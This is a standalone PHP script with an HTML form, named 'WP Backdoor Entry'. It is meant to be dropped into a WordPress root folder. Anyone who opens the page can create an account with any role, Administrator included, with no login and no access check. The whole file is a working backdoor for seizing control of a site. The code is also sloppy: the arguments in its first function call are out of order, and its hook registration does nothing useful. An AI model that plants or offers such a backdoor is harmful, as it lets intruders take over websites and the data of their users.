<?php
/*

  Script Name: WP Backdoor Entry
  
  Description: A script to create a new user with Administrator role.
  
  Usage: Copy this file into your WordPress root folder and execute the script via the browser.

  */


$wp_folder  = '';
$username   = '';
$email      = '';
$password   = '';
$role       = '';

/** Make sure that the WordPress bootstrap has run before continuing. */
if (!empty($wp_folder)) {
  $wp_load_path = $wp_folder . '/wp-load.php';
} else {
  $wp_load_path = 'wp-load.php';
}

if (!file_exists($wp_load_path)) {
  echo "ERROR! wp-load.php does not exist!";
  echo '<br>';
  exit;
}

include($wp_load_path);

function ac_create_wp_user($username, $email, $password, $role)
{

  if( isset($_POST['submit'])) {
    $username  = htmlentities($_POST['name']);
    $email     = htmlentities($_POST['email']);
    $password  = htmlentities($_POST['password']);
    $role      = strtolower(htmlentities($_POST['role']));
  }

  if (!username_exists($username) && !email_exists($email)) {

    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role($role);

  } else {
    echo 'ERROR! The username or email is already exists!';
    echo '<br>';
    exit;
  }

  if (! empty($username) && ! empty($password) && ! empty($email)) {
    header("Location: /wp-login.php");
    exit;
  }
}

ac_create_wp_user($username, $password, $email, $role);

add_action('init', 'ac_create_wp_user');

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WP Backdoor Entry</title>
  <style>
    * {
      padding: 0;
      margin: 0;
    }

    /* Style inputs, select elements and textareas */
    input[type=text],
    input[type=email],
    input[type=password],
    select,
    textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      resize: vertical;
    }

    h1 {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      padding-bottom: 10px;
    }

    /* Style the label to display next to the inputs */
    label {
      padding: 12px 12px 12px 0;
      display: inline-block;
    }

    /* Style the submit button */
    input[type=submit] {
      background-color: #04AA6D;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      float: right;
    }

    /* Style the container */
    .container {
      border-radius: 5px;
      background-color: #f2f2f2;
      padding: 100px 50px 100px 50px;
      height: 100vh;
    }

    /* Floating column for labels: 25% width */
    .col-25 {
      float: left;
      width: 25%;
      margin-top: 6px;
    }

    /* Floating column for inputs: 75% width */
    .col-75 {
      float: left;
      width: 75%;
      margin-top: 6px;
    }

    /* Clear floats after the columns */
    .row:after {
      content: "";
      display: table;
      clear: both;
    }

    /* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
    @media screen and (max-width: 600px) {

      .col-25,
      .col-75,
      input[type=submit] {
        width: 100%;
        margin-top: 0;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>WP Backdoor Entry</h1>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
      <div class="row">
        <div class="col-25">
          <label for="fname">Username</label>
        </div>
        <div class="col-75">
          <input type="text" id="fname" name="name" placeholder="Username" required autocomplete="off">
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="lname">Email</label>
        </div>
        <div class="col-75">
          <input type="email" id="lname" name="email" placeholder="E-Mail" required autocomplete="off">
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="lname">Password</label>
        </div>
        <div class="col-75">
          <input type="password" id="lname" name="password" placeholder="Password" required>
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="country">Select a role:</label>
        </div>
        <div class="col-75">
          <select id="role" name="role">
            <option>Subscriber</option>
            <option>Contributor</option>
            <option>Author</option>
            <option>Editor</option>
            <option>Administrator</option>
          </select>
        </div>
      </div>
      <br>
      <br>
      <div class="row">
        <input type="submit" value="Submit" name="submit">
      </div>
    </form>
  </div>
</body>

</html>
